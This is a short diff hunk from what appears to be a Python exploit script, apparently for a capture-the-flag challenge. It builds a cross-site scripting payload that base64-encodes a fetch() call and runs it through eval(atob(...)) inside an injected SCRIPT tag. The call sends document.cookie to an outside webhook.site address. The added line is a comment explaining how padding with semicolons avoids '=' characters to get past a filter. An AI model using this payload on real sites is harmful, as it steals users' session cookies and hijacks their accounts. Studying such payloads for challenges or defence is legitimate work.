@@ -53,6 +53,8 @@ substitutions = {
 
 
 js_payload = b"fetch('https://webhook.site/51db469d-d555-4496-b6fc-9cc9d9344385/?flag=' + document.cookie);;"
+# Extra ';' in the js_payload is to add padding since '=' is not allowed and the payload is going to be base64-encoded
+
 encoded = b64encode(js_payload).decode()
 payload = f"</div><SCRIPT>eval(window.atob(`{encoded}`))</SCRIPT>"
 
